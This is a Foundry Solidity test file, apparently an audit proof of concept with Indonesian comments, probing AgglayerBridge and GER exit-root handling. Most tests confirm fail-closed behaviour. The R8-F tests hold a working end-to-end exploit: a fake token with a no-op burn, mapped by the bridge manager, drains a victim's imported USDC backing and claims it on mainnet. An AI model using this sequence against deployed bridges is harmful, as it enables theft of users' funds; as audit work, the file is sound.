// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.28;

// PoC audit ronde 8 worker B — AggLayer GER + L1InfoTree
// (agglayer-contracts @ 110bda5a, HEAD tidak bergerak vs r1-r7:
// main 110bda5a, develop cfdca3c2).
// Area BARU (tugas r8): L1InfoTree leaf insertion/index management, leaf-hash
// collisions & domain separation mainnet-vs-rollup, depth limits / tree penuh,
// aliasing GER rollup-vs-mainnet di jalur SELAIN nullifier (R6-B sudah cover
// nullifier), update paths AgglayerGER (race, stale, replay), interaksi GER
// dengan bridge claim (klaim atas GER lama), dan token-mapping sovereign
// (setMultipleSovereignTokenAddress) vs LBT.
// Yang TIDAK diulang: R6-B (aliasing nullifier), R6-C (GER duplikat/rollback
// via caller), R6-A (gateway route), R6-D (unset/setMultipleClaims),
// ClaimCompressor (r2 Low), backwardLET GER stall (r2 D1, fixed upstream).

import "forge-std/Test.sol";
import {AgglayerBridge} from "../src/AgglayerBridge.sol";
import {AgglayerBridgeL2} from "../src/sovereignChains/AgglayerBridgeL2.sol";
import {AgglayerGER} from "../src/AgglayerGER.sol";
import {DepositContractBase} from "../src/lib/DepositContractBase.sol";
import {IBaseLegacyAgglayerGER} from "../src/interfaces/IBaseLegacyAgglayerGER.sol";
import {IAgglayerBridgeL2} from "../src/interfaces/IAgglayerBridgeL2.sol";
import {MerkleHelper} from "./AgglayerR1.t.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts5/proxy/ERC1967/ERC1967Proxy.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts52/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProxyAdmin} from "@openzeppelin/contracts52/proxy/transparent/ProxyAdmin.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Mock GER L2 untuk BridgeL2: GER apa pun dianggap ada, dan
/// globalExitRootRemover = test contract ini.
contract MockGERL2GER {
    address public remover;

    constructor(address _remover) {
        remover = _remover;
    }

    function updateExitRoot(bytes32) external {}

    function globalExitRootMap(bytes32) external pure returns (uint256) {
        return 1;
    }

    function globalExitRootRemover() external view returns (address) {
        return remover;
    }
}

/// @notice ERC20 minimal untuk mendanai bridge mainnet (USDC tiruan).
contract MockUSDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice Token penyerang: burn() adalah NO-OP (tidak mengurangi saldo).
/// Dipakai untuk membuktikan bridgeAsset tidak memverifikasi burn secara
/// ekonomi — yang membatasi hanyalah saldo LBT global, bukan saldo caller.
contract FakeBurnToken {
    string public name = "Fake";
    string public symbol = "FAKE";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function burn(address, uint256) external {
        // NO-OP dengan sengaja: tidak ada token yang dibakar.
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice Expose _addLeaf + depositCount GER untuk uji batas tree penuh.
contract GERHarness is AgglayerGER {
    constructor(address m, address b) AgglayerGER(m, b) {}

    function setDepositCount(uint256 v) external {
        depositCount = v;
    }

    function addLeaf(bytes32 l) external {
        _addLeaf(l);
    }
}

/// @notice Expose _addLeaf + depositCount bridge exit tree (mainnet).
contract BridgeLeafHarness is AgglayerBridge {
    function setDepositCount(uint256 v) external {
        depositCount = v;
    }

    function addLeaf(bytes32 l) external {
        _addLeaf(l);
    }
}

contract AgglayerR8GERTest is Test {
    address public user = address(0xBEEF);
    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");
    address public managerAddr = makeAddr("bridgeManager");
    address public mockBridgeAddr = makeAddr("mockBridge");
    address public mockManagerAddr = makeAddr("mockManager");

    uint256 public constant MAINNET_FLAG = 2 ** 64;
    uint256 public constant MAX_DEPOSIT_COUNT = 2 ** 32 - 1;

    AgglayerGER public ger;
    AgglayerBridge public bridgeMain;
    AgglayerBridgeL2 public bridgeL2;
    MockGERL2GER public mockGerL2;
    MockUSDC public usdc;
    FakeBurnToken public fakeToken;

    function setUp() public {
        vm.warp(1_700_000_000);
        vm.deal(address(this), 100 ether);
        vm.deal(user, 100 ether);
        vm.deal(victim, 100 ether);
        vm.deal(attacker, 100 ether);

        // --- GER asli (proxy), bridge + manager adalah alamat mock ---
        AgglayerGER gerImpl = new AgglayerGER(mockManagerAddr, mockBridgeAddr);
        ger = AgglayerGER(address(new ERC1967Proxy(address(gerImpl), "")));
        ger.initialize();

        // --- Bridge mainnet asli (network 0) di balik Transparent proxy ---
        AgglayerBridge bridgeImpl = new AgglayerBridge();
        ProxyAdmin proxyAdmin = new ProxyAdmin(address(this));
        bridgeMain = AgglayerBridge(
            payable(
                address(
                    new TransparentUpgradeableProxy(
                        address(bridgeImpl),
                        address(proxyAdmin),
                        ""
                    )
                )
            )
        );
        bridgeMain.initialize(
            0, // networkID = mainnet
            address(0), // gas token = ether
            0,
            IBaseLegacyAgglayerGER(address(ger)),
            address(this), // polygonRollupManager = test ini
            ""
        );
        vm.deal(address(bridgeMain), 10 ether);
        usdc = new MockUSDC();
        usdc.mint(address(bridgeMain), 5_000_000e6);

        // --- BridgeL2 sovereign (network 2) + MockGERL2 ---
        mockGerL2 = new MockGERL2GER(address(this));
        AgglayerBridgeL2 bridgeImplL2 = new AgglayerBridgeL2();
        bridgeL2 = AgglayerBridgeL2(
            payable(address(new ERC1967Proxy(address(bridgeImplL2), "")))
        );
        bridgeL2.initialize(
            2, // NETWORK_ID sovereign
            address(0), // gas token = ether
            0,
            IBaseLegacyAgglayerGER(address(mockGerL2)),
            address(this), // polygonRollupManager = test ini
            "",
            managerAddr, // bridgeManager = role terpisah (model: admin chain)
            address(0), // sovereign WETH: tidak ada
            false,
            address(this), // emergency pauser = test ini
            address(this), // emergency unpauser = test ini
            address(this) // proxiedTokensManager
        );
        vm.deal(address(bridgeL2), 10 ether);
        fakeToken = new FakeBurnToken();
    }

    // ================= helpers =================

    function _ger(bytes32 m, bytes32 r) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(m, r));
    }

    function _lbtKey(
        uint32 originNetwork,
        address originTokenAddress
    ) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(originNetwork, originTokenAddress));
    }

    /// @notice Replika AgglayerManager.getRollupExitRoot untuk 1 rollup.
    function _rollupRoot1(bytes32 lr) internal pure returns (bytes32 root) {
        root = lr;
        bytes32 zh = bytes32(0);
        for (uint256 i; i < 32; i++) {
            root = keccak256(abi.encodePacked(root, zh));
            zh = keccak256(abi.encodePacked(zh, zh));
        }
    }

    /// @notice Proof rollup-tree untuk index 0 pada tree 1 rollup.
    function _rollupProof1()
        internal
        pure
        returns (bytes32[32] memory proof)
    {
        for (uint256 h; h < 32; h++) {
            proof[h] = MerkleHelper.zeroHash(h);
        }
    }

    /// @notice Panggil claimAsset via low-level call agar hasil boolean
    /// tertangkap (bukan revert test).
    function _claimAssetRaw(
        address bridge,
        bytes32[32] memory proofLocal,
        bytes32[32] memory proofRollup,
        uint256 globalIndex,
        bytes32 mainnetExitRoot,
        bytes32 rollupExitRoot,
        uint32 originNetwork,
        address originTokenAddress,
        uint32 destinationNetwork,
        address destinationAddress,
        uint256 amount,
        bytes memory metadata
    ) internal returns (bool ok, bytes memory ret) {
        (ok, ret) = bridge.call(
            abi.encodeCall(
                AgglayerBridge.claimAsset,
                (
                    proofLocal,
                    proofRollup,
                    globalIndex,
                    mainnetExitRoot,
                    rollupExitRoot,
                    originNetwork,
                    originTokenAddress,
                    destinationNetwork,
                    destinationAddress,
                    amount,
                    metadata
                )
            )
        );
    }

    function _recordGer(bytes32 m, bytes32 r) internal {
        vm.prank(mockBridgeAddr);
        ger.updateExitRoot(m);
        vm.prank(mockManagerAddr);
        ger.updateExitRoot(r);
    }

    // ============ R8-C1: globalIndex rollup-index overflow ============
    // _validateAndDecodeGlobalIndex: sourceBridgeNetwork = indexRollup + 1
    // (uint32). indexRollup = 2^32-1 harus OVERFLOW -> panic, bukan wrap ke
    // source 0 (mainnet). Varian 2^32-2 -> source = 2^32-1, proof gagal.

    function test_R8C1_globalIndexRollupIndexOverflowReverts() public {
        bytes32 m = bytes32(uint256(0xA1));
        bytes32 r = bytes32(uint256(0xB1));
        _recordGer(m, r);

        bytes32[32] memory emptyProof;
        // indexRollup = 0xFFFFFFFF -> +1 overflow uint32
        (bool ok, bytes memory ret) = _claimAssetRaw(
            address(bridgeMain),
            emptyProof,
            emptyProof,
            (uint256(0xFFFFFFFF) << 32) | uint256(0),
            m,
            r,
            0,
            address(0),
            0,
            user,
            1 ether,
            ""
        );
        assertFalse(ok, "R8-C1: indexRollup max HARUS revert (bukan wrap)");
        assertEq(
            bytes4(ret),
            bytes4(0x4e487b71),
            "R8-C1: revert harus Panic(0x11) arithmetic overflow"
        );
        assertEq(ret.length, 36, "R8-C1: panic returndata 4+32 byte");
        emit log("R8-C1: indexRollup=2^32-1 -> Panic 0x11, FAIL-CLOSED");
    }

    function test_R8C1b_globalIndexRollupIndexMaxMinusOneFailsProof() public {
        bytes32 m = bytes32(uint256(0xA1));
        bytes32 r = bytes32(uint256(0xB1));
        _recordGer(m, r);

        bytes32[32] memory emptyProof;
        // indexRollup = 0xFFFFFFFE -> source = 0xFFFFFFFF (tidak overflow),
        // tapi tidak ada rollup di posisi itu -> proof gagal.
        (bool ok, bytes memory ret) = _claimAssetRaw(
            address(bridgeMain),
            emptyProof,
            emptyProof,
            (uint256(0xFFFFFFFE) << 32) | uint256(0),
            m,
            r,
            0,
            address(0),
            0,
            user,
            1 ether,
            ""
        );
        assertFalse(ok, "R8-C1b: indexRollup max-1 HARUS revert");
        assertEq(
            bytes4(ret),
            bytes4(keccak256("InvalidSmtProof()")),
            "R8-C1b: revert harus InvalidSmtProof (bukan aliasing mainnet)"
        );
        emit log("R8-C1b: indexRollup=2^32-2 -> InvalidSmtProof, FAIL-CLOSED");
    }

    // ============ R8-C2: rollup leaf diklaim sebagai mainnet leaf ============
    // _verifyLeaf TIDAK memisahkan domain mainnet vs rollup: bila
    // mainnetExitRoot == local root sebuah rollup DAN pasangan (M, R) itu
    // tercatat di globalExitRootMap, leaf rollup lolos verifikasi cabang
    // mainnet (nullifier mainnet ikut ter-set). Bagian 2 membuktikan mengapa
    // ini TIDAK tercapai di produksi: root kedua tree tidak bisa sama karena
    // originNetwork terikat di preimage leaf; dan root tree kosong (Z) tidak
    // pernah tercatat sebagai GER mainnet.

    function test_R8C2_rollupLeafClaimedAsMainnetLeaf() public {
        // Leaf di "tree rollup" (originNetwork 1), tujuan mainnet.
        // Metadata wajib abi.encode(name,symbol,decimals): klaim lewat jalur
        // wrapped-token men-deploy wrapped baru dari metadata ini.
        bytes memory metadata = abi.encode("Wrapped", "WRP", uint8(18));
        bytes32 leaf = MerkleHelper.leafValue(
            0, // asset
            1, // originNetwork = rollup 1
            address(0),
            0, // destinationNetwork = mainnet
            user,
            1 ether,
            keccak256(metadata)
        );
        bytes32[] memory leaves = new bytes32[](1);
        leaves[0] = leaf;
        bytes32 lr = MerkleHelper.treeRoot(leaves);
        bytes32 r = bytes32(uint256(0xB1));

        // Skenario alias: GER mencatat mainnetExitRoot == LR rollup.
        vm.prank(mockBridgeAddr);
        ger.updateExitRoot(lr);
        vm.prank(mockManagerAddr);
        ger.updateExitRoot(r);
        assertEq(ger.getLastGlobalExitRoot(), _ger(lr, r), "GER alias harus tercatat");

        bytes32[32] memory proofLocal = MerkleHelper.treeProof(leaves, 0);
        bytes32[32] memory emptyProof;
        // Klaim leaf rollup LEWAT cabang mainnet (mainnetFlag, M = LR).
        (bool ok, ) = _claimAssetRaw(
            address(bridgeMain),
            proofLocal,
            emptyProof,
            MAINNET_FLAG | uint256(0),
            lr, // mainnetExitRoot = local root rollup
            r,
            1, // originNetwork rollup
            address(0),
            0,
            user,
            1 ether,
            metadata
        );
        assertTrue(ok, "R8-C2: klaim alias HARUS sukses (tidak ada domain separation)");
        assertTrue(
            bridgeMain.isClaimed(0, 0),
            "R8-C2: nullifier MAINNET (0,0) ter-set oleh leaf rollup"
        );
        emit log("R8-C2: rollup leaf lolos cabang mainnet bila M==LR (mekanisme TERBUKTI)");
    }

    function test_R8C2b_rootsCannotCoincideInProduction() public {
        // Tree yang sama persis kecuali originNetwork -> root BERBEDA.
        bytes32 leafM = MerkleHelper.leafValue(
            0, 0, address(0), 0, user, 1 ether, keccak256("")
        );
        bytes32 leafR = MerkleHelper.leafValue(
            0, 1, address(0), 0, user, 1 ether, keccak256("")
        );
        bytes32[] memory lm = new bytes32[](1);
        lm[0] = leafM;
        bytes32[] memory lr = new bytes32[](1);
        lr[0] = leafR;
        assertTrue(
            MerkleHelper.treeRoot(lm) != MerkleHelper.treeRoot(lr),
            "R8-C2b: root mainnet vs rollup HARUS berbeda"
        );
        // Root tree kosong Z tidak pernah tercatat sebagai GER mainnet.
        bytes32[] memory empty = new bytes32[](0);
        bytes32 z = MerkleHelper.treeRoot(empty);
        assertTrue(z != bytes32(0), "R8-C2b: root tree kosong bukan 0");
        assertEq(
            ger.globalExitRootMap(_ger(z, bytes32(0))),
            0,
            "R8-C2b: GER H(Z,0) tidak tercatat"
        );
        assertEq(
            ger.globalExitRootMap(_ger(z, z)),
            0,
            "R8-C2b: GER H(Z,Z) tidak tercatat"
        );
        emit log("R8-C2b: aliasing M==LR tidak tercapai di produksi (NEGATIF)");
    }

    // ============ R8-C3: tree penuh -> revert fail-closed ============
    // _addLeaf (DepositContractBase) revert MerkleTreeFull saat
    // depositCount == 2^32-1, di L1InfoTree GER maupun exit tree bridge.

    function test_R8C3_l1InfoTreeFullRevertsFailClosed() public {
        GERHarness gh = new GERHarness(mockManagerAddr, mockBridgeAddr);
        gh.setDepositCount(MAX_DEPOSIT_COUNT - 1);
        vm.prank(mockBridgeAddr);
        gh.updateExitRoot(bytes32(uint256(0x11)));
        assertEq(
            gh.depositCount(),
            MAX_DEPOSIT_COUNT,
            "R8-C3: depositCount harus mencapai MAX"
        );
        vm.prank(mockBridgeAddr);
        vm.expectRevert(DepositContractBase.MerkleTreeFull.selector);
        gh.updateExitRoot(bytes32(uint256(0x22)));
        emit log("R8-C3: L1InfoTree penuh -> MerkleTreeFull, FAIL-CLOSED");
    }

    function test_R8C3b_bridgeExitTreeFullRevertsFailClosed() public {
        BridgeLeafHarness bh = new BridgeLeafHarness();
        bh.setDepositCount(MAX_DEPOSIT_COUNT);
        vm.expectRevert(DepositContractBase.MerkleTreeFull.selector);
        bh.addLeaf(bytes32(uint256(0x1)));
        emit log("R8-C3b: exit tree penuh -> MerkleTreeFull, FAIL-CLOSED");
    }

    // ============ R8-C4: race dua update + klaim atas GER lama ============
    // Bridge dan manager update di blok yang sama, dua urutan berbeda ->
    // state akhir IDENTIK; GER intermediate keduanya tercatat. Klaim atas
    // GER lama tetap valid setelah GER bergerak maju.

    function test_R8C4_sameBlockRaceBothOrdersSameFinalState() public {
        bytes32 m2 = bytes32(uint256(0xA2));
        bytes32 r2 = bytes32(uint256(0xB2));

        AgglayerGER gerImplA = new AgglayerGER(mockManagerAddr, mockBridgeAddr);
        AgglayerGER gerA = AgglayerGER(
            address(new ERC1967Proxy(address(gerImplA), ""))
        );
        gerA.initialize();
        AgglayerGER gerImplB = new AgglayerGER(mockManagerAddr, mockBridgeAddr);
        AgglayerGER gerB = AgglayerGER(
            address(new ERC1967Proxy(address(gerImplB), ""))
        );
        gerB.initialize();

        // Urutan 1: bridge dulu, manager kemudian.
        vm.prank(mockBridgeAddr);
        gerA.updateExitRoot(m2);
        vm.prank(mockManagerAddr);
        gerA.updateExitRoot(r2);
        // Urutan 2: manager dulu, bridge kemudian.
        vm.prank(mockManagerAddr);
        gerB.updateExitRoot(r2);
        vm.prank(mockBridgeAddr);
        gerB.updateExitRoot(m2);

        assertEq(
            gerA.getLastGlobalExitRoot(),
            gerB.getLastGlobalExitRoot(),
            "R8-C4: GER akhir harus sama di kedua urutan"
        );
        assertEq(
            gerA.lastMainnetExitRoot(),
            gerB.lastMainnetExitRoot(),
            "R8-C4: lastMainnet harus sama"
        );
        assertEq(
            gerA.lastRollupExitRoot(),
            gerB.lastRollupExitRoot(),
            "R8-C4: lastRollup harus sama"
        );
        assertEq(gerA.depositCount(), 2, "R8-C4: gerA harus punya 2 leaf L1Info");
        assertEq(gerB.depositCount(), 2, "R8-C4: gerB harus punya 2 leaf L1Info");
        assertTrue(
            gerA.globalExitRootMap(_ger(m2, bytes32(0))) != 0,
            "R8-C4: GER intermediate H(M2,0) tercatat"
        );
        assertTrue(
            gerB.globalExitRootMap(_ger(bytes32(0), r2)) != 0,
            "R8-C4: GER intermediate H(0,R2) tercatat"
        );
        emit log("R8-C4: race dua update -> state akhir identik, NEGATIF");
    }

    function test_R8C4b_oldGerClaimStillValid() public {
        bytes32 leaf = MerkleHelper.leafValue(
            0, 0, address(0), 0, user, 1 ether, keccak256("")
        );
        bytes32 leaf2 = MerkleHelper.leafValue(
            0, 0, address(0), 0, user, 2 ether, keccak256("")
        );
        bytes32[] memory one = new bytes32[](1);
        one[0] = leaf;
        bytes32 m1 = MerkleHelper.treeRoot(one);
        bytes32[] memory two = new bytes32[](2);
        two[0] = leaf;
        two[1] = leaf2;
        bytes32 m2 = MerkleHelper.treeRoot(two);
        bytes32 r1 = bytes32(uint256(0xB1));

        // G1 = H(M1,R1) tercatat, lalu GER maju ke G2 = H(M2,R1).
        vm.prank(mockBridgeAddr);
        ger.updateExitRoot(m1);
        vm.prank(mockManagerAddr);
        ger.updateExitRoot(r1);
        vm.prank(mockBridgeAddr);
        ger.updateExitRoot(m2);
        assertEq(ger.getLastGlobalExitRoot(), _ger(m2, r1), "GER harus sudah maju ke G2");

        // Klaim leaf lama memakai GER LAMA (M1,R1) -> tetap sukses.
        bytes32[32] memory proofLocal = MerkleHelper.treeProof(one, 0);
        bytes32[32] memory emptyProof;
        uint256 balBefore = user.balance;
        (bool ok, ) = _claimAssetRaw(
            address(bridgeMain),
            proofLocal,
            emptyProof,
            MAINNET_FLAG | uint256(0),
            m1, // mainnetExitRoot LAMA
            r1,
            0,
            address(0),
            0,
            user,
            1 ether,
            ""
        );
        assertTrue(ok, "R8-C4b: klaim atas GER lama HARUS sukses");
        assertEq(user.balance, balBefore + 1 ether, "R8-C4b: user harus dibayar 1 ether");
        assertTrue(bridgeMain.isClaimed(0, 0), "R8-C4b: nullifier harus ter-set");
        emit log("R8-C4b: klaim atas GER lama tetap valid setelah GER maju (by design)");
    }

    // ============ R8-C5: validasi frontier backwardLET ============
    // backwardLET (onlyGlobalExitRootRemover + emergency): proof nextLeaf
    // mengikat frontier; frontier yang dipalsu di posisi bit-set -> 
    // SubtreeFrontierMismatch; nilai nonzero di posisi bit-unset ->
    // NonZeroValueForUnusedFrontier. Kontrol: frontier benar -> sukses dan
    // root == root 3 leaf pertama.

    function _l2FiveLeaves() internal returns (bytes32[] memory leaves) {
        leaves = new bytes32[](5);
        for (uint256 i; i < 5; i++) {
            bytes memory md = abi.encode(i);
            vm.prank(address(this));
            bridgeL2.bridgeMessage(1, user, false, md);
            leaves[i] = MerkleHelper.leafValue(
                1, // message
                2, // originNetwork = chain ini
                address(this),
                1, // destinationNetwork
                user,
                0,
                keccak256(md)
            );
        }
        assertEq(bridgeL2.depositCount(), 5, "R8-C5: harus ada 5 leaf L2");
        assertEq(
            bridgeL2.getRoot(),
            MerkleHelper.treeRoot(leaves),
            "R8-C5: root L2 harus cocok"
        );
    }

    function _frontierFor3(
        bytes32[32] memory proof
    ) internal pure returns (bytes32[32] memory f) {
        f[0] = proof[0];
        f[1] = proof[1];
        // f[2..31] = 0 (bit 2+ dari N=3 tidak set)
    }

    function test_R8C5_backwardLetValidFrontierSucceeds() public {
        bytes32[] memory leaves = _l2FiveLeaves();
        bridgeL2.activateEmergencyState();
        bytes32[32] memory proof = MerkleHelper.treeProof(leaves, 3);
        bytes32[32] memory frontier = _frontierFor3(proof);
        bytes32[] memory first3 = new bytes32[](3);
        first3[0] = leaves[0];
        first3[1] = leaves[1];
        first3[2] = leaves[2];

        bridgeL2.backwardLET(3, frontier, leaves[3], proof);
        assertEq(bridgeL2.depositCount(), 3, "R8-C5: depositCount harus 3");
        assertEq(
            bridgeL2.getRoot(),
            MerkleHelper.treeRoot(first3),
            "R8-C5: root harus == root 3 leaf pertama"
        );
        emit log("R8-C5: backwardLET frontier benar -> sukses, root eksak");
    }

    function test_R8C5b_backwardLetTamperedFrontierReverts() public {
        bytes32[] memory leaves = _l2FiveLeaves();
        bridgeL2.activateEmergencyState();
        bytes32[32] memory proof = MerkleHelper.treeProof(leaves, 3);
        bytes32[32] memory frontier = _frontierFor3(proof);
        frontier[0] = bytes32(uint256(0xDEAD)); // posisi bit-set dipalsu
        vm.expectRevert(DepositContractBase.SubtreeFrontierMismatch.selector);
        bridgeL2.backwardLET(3, frontier, leaves[3], proof);
        emit log("R8-C5b: frontier palsu -> SubtreeFrontierMismatch, FAIL-CLOSED");
    }

    function test_R8C5c_backwardLetNonZeroUnusedFrontierReverts() public {
        bytes32[] memory leaves = _l2FiveLeaves();
        bridgeL2.activateEmergencyState();
        bytes32[32] memory proof = MerkleHelper.treeProof(leaves, 3);
        bytes32[32] memory frontier = _frontierFor3(proof);
        frontier[2] = bytes32(uint256(0x1)); // posisi bit-unset (N=3) diisi
        vm.expectRevert(
            DepositContractBase.NonZeroValueForUnusedFrontier.selector
        );
        bridgeL2.backwardLET(3, frontier, leaves[3], proof);
        emit log("R8-C5c: frontier nonzero di posisi unused -> revert, FAIL-CLOSED");
    }

    // ============ R8-F: forged-origin exit via sovereign token mapping ============
    // AgglayerBridgeL2.setMultipleSovereignTokenAddress (onlyBridgeManager)
    // memetakan token ARBITRER ke (originNetwork, originTokenAddress) ARBITRER
    // — termasuk mainnet (0) — tanpa menolak originNetwork == 0 dan tanpa
    // memeriksa token itu bridge-controlled. bridgeAsset lalu membuat leaf
    // dengan origin tersebut; satu-satunya pengaman on-chain adalah
    // _decreaseLocalBalanceTree (LBT GLOBAL per token, bukan per user) dan
    // burn() token itu sendiri (yang dipercayakan ke kontrak token).
    // Bila token penyerang punya burn() no-op, penyerang bisa exit sampai
    // sebesar saldo LBT global — yaitu dana import user LAIN — tanpa modal.

    function _mapFakeToMainnetUsdc() internal {
        uint32[] memory nets = new uint32[](1);
        nets[0] = 0; // originNetwork = mainnet
        address[] memory origins = new address[](1);
        origins[0] = address(usdc);
        address[] memory sovs = new address[](1);
        sovs[0] = address(fakeToken);
        bool[] memory notMint = new bool[](1);
        notMint[0] = false;
        vm.prank(managerAddr);
        bridgeL2.setMultipleSovereignTokenAddress(nets, origins, sovs, notMint);
    }

    /// @notice Saldo wrapped token via caller non-admin: proxy wrapped
    /// di-admin oleh test contract ini, jadi direct call revert.
    function _wbal(address token, address who) internal returns (uint256) {
        vm.prank(user);
        return IERC20(token).balanceOf(who);
    }

    function _bridgeAssetRaw(
        address bridge,
        address caller,
        uint32 destNet,
        address dest,
        uint256 amount,
        address token
    ) internal returns (bool ok) {
        vm.prank(caller);
        (ok, ) = bridge.call(
            abi.encodeCall(
                AgglayerBridge.bridgeAsset,
                (destNet, dest, amount, token, false, "")
            )
        );
    }

    function test_R8F_forgedOriginBlockedWithoutImport() public {
        _mapFakeToMainnetUsdc();
        // Tanpa import USDC apa pun, LBT[(0,USDC)] = 0 -> bridge revert.
        bool ok = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            1000e6,
            address(fakeToken)
        );
        assertFalse(ok, "R8-F: bridge tanpa import HARUS revert (LBT 0)");
        assertEq(bridgeL2.depositCount(), 0, "R8-F: tidak boleh ada leaf");
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            0,
            "R8-F: LBT tetap 0"
        );
        emit log("R8-F (kontrol negatif): tanpa import, LBT gate memblokir");
    }

    function test_R8F_forgedOriginDrainsImportedBalance() public {
        uint256 IMPORT = 1000e6;

        // --- 1. Korban import 1000 USDC mainnet -> S (sah) ---
        // Metadata = metadata token asli: klaim wrapped-token men-deploy
        // wrapped baru dari metadata ini.
        bytes memory importMetadata = abi.encode("USD Coin", "USDC", uint8(6));
        bytes32 importLeaf = MerkleHelper.leafValue(
            0, 0, address(usdc), 2, victim, IMPORT, keccak256(importMetadata)
        );
        bytes32[] memory importLeaves = new bytes32[](1);
        importLeaves[0] = importLeaf;
        bytes32 mainnetRoot = MerkleHelper.treeRoot(importLeaves);
        bytes32[32] memory proofLocal = MerkleHelper.treeProof(importLeaves, 0);
        bytes32[32] memory emptyProof;
        vm.prank(victim);
        bridgeL2.claimAsset(
            proofLocal,
            emptyProof,
            MAINNET_FLAG | uint256(0),
            mainnetRoot,
            bytes32(0),
            0,
            address(usdc),
            2,
            victim,
            IMPORT,
            importMetadata
        );
        address wrappedUsdc = bridgeL2.tokenInfoToWrappedToken(
            keccak256(abi.encodePacked(uint32(0), address(usdc)))
        );
        assertTrue(wrappedUsdc != address(0), "R8-F: wrapped USDC harus ter-deploy");
        assertEq(
            _wbal(wrappedUsdc, victim),
            IMPORT,
            "R8-F: korban harus pegang 1000 wrapped USDC"
        );
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            IMPORT,
            "R8-F: LBT[(0,USDC)] harus 1000"
        );

        // --- 2. bridgeManager memetakan token palsu -> (0, USDC) ---
        _mapFakeToMainnetUsdc();

        // --- 3. Penyerang (0 wrapped, 0 fake) bridge 1000 via burn no-op ---
        assertEq(
            fakeToken.balanceOf(attacker),
            0,
            "R8-F: penyerang pegang 0 fake token (zero-cost)"
        );
        bool okBridge = _bridgeAssetRaw(
            address(bridgeL2),
            attacker,
            0,
            attacker,
            IMPORT,
            address(fakeToken)
        );
        assertTrue(okBridge, "R8-F: bridge token palsu HARUS sukses (LBT cukup)");
        assertEq(
            fakeToken.balanceOf(attacker),
            0,
            "R8-F: burn no-op, saldo fake tetap 0"
        );
        assertEq(
            bridgeL2.localBalanceTree(_lbtKey(0, address(usdc))),
            0,
            "R8-F: LBT terkuras 1000 -> 0 oleh penyerang"
        );
        assertEq(bridgeL2.depositCount(), 1, "R8-F: 1 leaf palsu tercipta");

        // --- 4. Penyerang klaim leaf palsu di mainnet -> USDC asli ---
        bytes memory fakeMetadata = abi.encode("Fake", "FAKE", uint8(18));
        bytes32 fakeLeaf = MerkleHelper.leafValue(
            0, 0, address(usdc), 0, attacker, IMPORT, keccak256(fakeMetadata)
        );
        bytes32[] memory fakeLeaves = new bytes32[](1);
        fakeLeaves[0] = fakeLeaf;
        bytes32 lr = MerkleHelper.treeRoot(fakeLeaves);
        bytes32 r = _rollupRoot1(lr);
        bytes32 m = bridgeMain.getRoot();
        _recordGer(m, r);

        bytes32[32] memory fakeProofLocal = MerkleHelper.treeProof(fakeLeaves, 0);
        (bool okClaim, ) = _claimAssetRaw(
            address(bridgeMain),
            fakeProofLocal,
            _rollupProof1(),
            0, // globalIndex: rollupIndex 0, leafIndex 0
            m,
            r,
            0, // originNetwork = mainnet (palsu)
            address(usdc),
            0,
            attacker,
            IMPORT,
            fakeMetadata
        );
        assertTrue(okClaim, "R8-F: klaim mainnet atas leaf palsu HARUS sukses");
        assertEq(
            usdc.balanceOf(attacker),
            IMPORT,
            "R8-F: penyerang menerima 1000 USDC ASLI dari bridge mainnet"
        );
        assertEq(
            usdc.balanceOf(address(bridgeMain)),
            5_000_000e6 - IMPORT,
            "R8-F: saldo USDC bridge mainnet berkurang 1000"
        );

        // --- 5. Korban kini TIDAK BISA keluar: wrapped-nya tidak ber-backing ---
        bool okVictimExit = _bridgeAssetRaw(
            address(bridgeL2),
            victim,
            0,
            victim,
            IMPORT,
            wrappedUsdc
        );
        assertFalse(okVictimExit, "R8-F: exit korban HARUS revert (LBT habis)");
        assertEq(
            _wbal(wrappedUsdc, victim),
            IMPORT,
            "R8-F: wrapped korban tetap 1000 (burn ter-rollback), tapi tak ber-backing"
        );
        emit log("R8-F: PENCURIAN end-to-end TERBUKTI (dana import korban dikuras)");
    }
}
